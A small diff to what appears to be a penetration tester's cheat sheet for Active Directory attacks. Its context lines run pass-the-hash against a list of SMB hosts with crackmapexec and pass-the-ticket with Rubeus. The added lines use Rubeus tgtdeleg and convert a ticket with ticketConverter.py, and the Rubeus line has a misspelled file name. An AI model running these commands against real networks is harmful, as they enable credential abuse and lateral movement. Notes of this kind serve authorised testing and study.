@@ -56,4 +56,6 @@ crackmapexec smb sambas.txt  -u wadmin -H aad3b435b51404eeaad3b435b51404ee:<HASH
 # Copy rubeus command add  `/nowrap`
 # Convert to kirbi file
 ./Rubeus.exe ptt /ticket:ticket.kirbi
+./Rubeus.exe tgtdeleg /ticket:ticket.kirby <service>
+ticketConverter.py ca-tgt.kirbi ca-tgt.ccache
 ```
